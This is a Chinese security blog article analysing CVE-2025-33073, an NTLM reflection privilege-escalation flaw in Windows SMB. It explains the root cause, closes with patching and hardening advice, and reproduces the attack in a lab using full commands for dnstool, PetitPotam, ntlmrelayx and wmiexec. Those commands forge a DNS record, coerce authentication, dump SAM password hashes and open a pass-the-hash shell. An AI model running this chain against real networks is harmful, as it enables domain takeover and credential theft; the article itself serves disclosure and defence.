> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkzMzYzNzIzNQ==&mid=2247485768&idx=1&sn=32b3f9aa0b7a38b4abcc1c3956a069f0

#  【内网安全】NTLM反射提权攻击  
qgg  安全驾驶舱   2025-06-20 06:43  
  
**背景**  
  
  
  
****  
  
近期  
微软修复了编号为CVE-2025-33073的SMB提权漏洞，该漏洞是NTLM Relay攻击的变种，属于NTLM Reflection攻击。攻击者能够在仅拥有一个普通域用户权限的情况下，远程对域内未开启SMB签名的机器(域控默认开启SMB签名)发起攻击，获取目标机上的最高权限。当攻击者拿下域内一台机器权限后在内网不断进行横向扩散，就会危及到整个域内的机器。  
  
**一、漏洞成因**  
  
  
  
****  
  
**1、SMB逻辑缺陷**  
  
当SMB客户端收到如下特殊格式的DNS名称时：  

```
cifs/adcs1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

  
会将其后面的字符串：  
  
1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA  
”以及服务类型“cifs/”移除，剩下字符串“adcs”作为目标主机名与如下内容进行比较，如果与下面任一字符串匹配成功，则DNS解析的目标机  
器会被认定为当前机器本身：  
  
①当前机器的FQDN，例如adcs.attack.com  
  
②当前机器的hostname，例如adcs  
  
③字符串"localhost"  
  
输入的DNS被处理后会成功匹配当前机器的主机名“adcs”，SMB客户端会将解析后的工作站名称“adcs”和域名“attack”填入NTLMSSP_NEGOTIATE消息字段，发送给SMB服务端。  
  
**2、NTLM本地认证**  
  
SMB服务端通过NTLMSSP_NEGOTIATE消息中的工作站名称Calling  workstaion name和域名Calling workstaion domain来判断是否进行本地认证。正常情况这两个字段值为空（NULL），如果存在且与当前计算机名称和域名相同，则会在NTLMSSP_CHALLENGE消息中将NTLMSSP_NEGOTIATE_LOCAL_CALL  
  
(0x00004000)字段设置为SET，并会创建服务器上下文并将其ID添加到Reserved字段中。  
  
**二、攻击复现**  
  
  
  
****  
  
**1、复现环境**  
  
**AD域控：192.168.96.10【DC$】**  
  
**ADCS：192.168.96.20 【ADCS$】**  
  
**攻击机kali：192.168.96.129**  
  
**域用户：qgg   域名：attack.com**  
  
**2、复现过程**  
  
使用nxc确认受害者机器ADCS未开启SMB签名，而域控开启了SMB签名（signing:True）：  
  
![nxc.png](https://mmbiz.qpic.cn/mmbiz_png/nk59nEwEn2NVawZE8IkMk9Y1ef6uXkgXDp7ro604xsjzhIv1w9mxvJ9wVabiadFcHYYcfoJ7BUoAPBzq9iakO8pQ/640?wx_fmt=png&from=appmsg "")  
  
使用dnstool向域控发起请求，创建恶意DNS记录使其指向攻击机IP，若要修改则将命令中的add改为modify：  

```
python dnstool.py -u'attack\qgg'-p'P@ssw0Rd'-r adcs1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d192.168.96.129--action add 192.168.96.10
```

  
![dnscret.png](https://mmbiz.qpic.cn/mmbiz_png/nk59nEwEn2NVawZE8IkMk9Y1ef6uXkgXprrgNQpJtQGf9GrPSic3ljI9iaLRfyPVuoet8qLEZ3NV583nw86hJQdw/640?wx_fmt=png&from=appmsg "")  
  
此时在AD目录中可以看到DNS成功创建：  
  
![dnslog.png](https://mmbiz.qpic.cn/mmbiz_png/nk59nEwEn2NVawZE8IkMk9Y1ef6uXkgX9VGZRzRDjbYnxE3fmswibkLCL32hv26tiaFdK2WaAQh1wABnHyUCcibuA/640?wx_fmt=png&from=appmsg "")  
  
在攻击机kali上使用petitpotam强制受害者机器向恶意DNS所指向的IP发起NTLM认证请求，同时在kali上开启监听：  

```
python PetitPotam.py -d attack.com -u qgg -p P@ssw0Rd adcs1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 192.168.96.20
```

  
![petitre.png](https://mmbiz.qpic.cn/mmbiz_png/nk59nEwEn2NVawZE8IkMk9Y1ef6uXkgXXsDA4TvIKmiaibGIKJ0jFOnu0UEKZIfEC8gaMr8XIjOlGGDTXKFwqdNw/640?wx_fmt=png&from=appmsg "")  
  
在攻击机kali上使用ntlmrelayx监听受害者的NTLM认证请求，并获取受害者机器SAM文件中存储的账号hash：  

```
python ntlmrelayx.py -t192.168.96.20-smb2support-ts
```

  
![ntlmrelay.png](https://mmbiz.qpic.cn/mmbiz_png/nk59nEwEn2NVawZE8IkMk9Y1ef6uXkgX0Fa2QLa7KMfSZvLd0fRhO4JGtJ94icfNvOsjibCzvmO7iarYZL7t71G6w/640?wx_fmt=png&from=appmsg "")  
  
使用wmiexec获取机器权限：  

```
python wmiexec.py -hashes  administrator@192.168.96.20-codec936
```

  
![wmi.png](https://mmbiz.qpic.cn/mmbiz_png/nk59nEwEn2NVawZE8IkMk9Y1ef6uXkgX2XAuPxgWbf0sw1PJib7xibV0bzNo5Q6bicTmaNITv1GrjVNdPzWbfAyQw/640?wx_fmt=png&from=appmsg "")  
  
  
**三、攻击分析**  
  
  
  
****  
  
攻击者使用域账号通过petitpotam向受害机器发起SMB认证建立连接，将恶意构造的DNS发送给受害机器ADCS并让其强制向DNS解析的IP地址发起NTLM认证。受害机器向域控发起DNS请求，获取到DNS条目对应的IP地址为攻击者kali的IP：![dnsask.png](https://mmbiz.qpic.cn/mmbiz_png/nk59nEwEn2NVawZE8IkMk9Y1ef6uXkgXYQhGe1kQl5579DzNPh8QMJFZ6ias50VNNcJQKpYWTib2hKnDewicCJq9g/640?wx_fmt=png&from=appmsg "")  
  
  
受害机器将恶意DNS经过上述SMB解析逻辑提取到工作站名，并将域名“ATTACK”和工作站名称“ADCS”分别填入“Calling workstation domain”和“Calling workstation name”两个字段，并放入NTLMSSP_NEGOTIATE包中发往kali攻击机：![padding.png](https://mmbiz.qpic.cn/mmbiz_png/nk59nEwEn2NVawZE8IkMk9Y1ef6uXkgXnjibRXxLdiaJCeI2etHdsLgBBzDnJlxxibRW4P9swrtwAqtPMZDHwT45A/640?wx_fmt=png&from=appmsg "")  
  
  
kali  
攻击  
机将来自受害机器的NTLMSSP_NEGOTIATE请求包中继回受害机器，请求包中“domain”和“name”成功匹配当前机器的主机名和域名，于是当前请求被判定为本地调用，从而进入NTLM本地认证流程。此时会在NTLMSSP_CHALLENGE消息中将NTLMSSP_NEGOTIATE_LOCAL_CALL(0x00004000)字段设置为SET，并创建服务器上下文，添加到全局上下文列表中，并将上下文ID放入Reserved字段发送给kali攻击机：  
![local.png](https://mmbiz.qpic.cn/mmbiz_png/nk59nEwEn2NVawZE8IkMk9Y1ef6uXkgXWAMR57g8yNtGMTODysIHLNKW0p8aJYlgl6h5icqGHwm1Mb2JNIFfbUg/640?wx_fmt=png&from=appmsg "")  
  
  
kali攻击机再  
将NTLMSSP_CHALLENGE消息中继回受害机器，受害机器通过0x00004000标志发现要走本地认证流程，于是将自己的身份令牌token通过Reserved字段的ID放入服务上下文中。SMB客户端和服务端为同一台机器，  
lsass.exe进程以SYSTEM权限向攻击机发起认证请求。此时不需要计算NTLM响应，NTLMSSP_AUTH直接返回空值：  
![empty.png](https://mmbiz.qpic.cn/mmbiz_png/nk59nEwEn2NVawZE8IkMk9Y1ef6uXkgXZXUZn2CTLgaiap4eU3OpHrakhnzTUSxgI12cgZrZDGjbMEqDUSMyh9w/640?wx_fmt=png&from=appmsg "")  
  
  
然后进行远程注册表操作，导出SAM数据库：![reg.png](https://mmbiz.qpic.cn/mmbiz_png/nk59nEwEn2NVawZE8IkMk9Y1ef6uXkgXE8dSUmxquzsiaFTgOdRVwwblzq5NacDNGiaXACqicf46bDIdByt63N64g/640?wx_fmt=png&from=appmsg "")  
  
  
最后建立admin$共享将账户hash回传：  
  
![admin$.png](https://mmbiz.qpic.cn/mmbiz_png/nk59nEwEn2NVawZE8IkMk9Y1ef6uXkgXzpxdiazteJxZn5nu10sK319jYibdHb2jbV7a160tBmoicwlmrlQoRJnlA/640?wx_fmt=png&from=appmsg "")  
  
  
**四、修复建议**  
  
  
  
****  
  
**1、及时更新安装补丁**  
  
直接通过Windows自动更新，或根据微软官方渠道安装补丁。  
  
**2、启用SMB签名**  
  
通过组策略批量启用SMB签名防护。  
  
**3、强化权限管理**  
  
禁止普通域用户创建DNS记录。  
  
**4、加强监测审计**  
  
实时监测并审计恶意DNS记录创建行为。  
  
**END**  
  
  
  
  
  
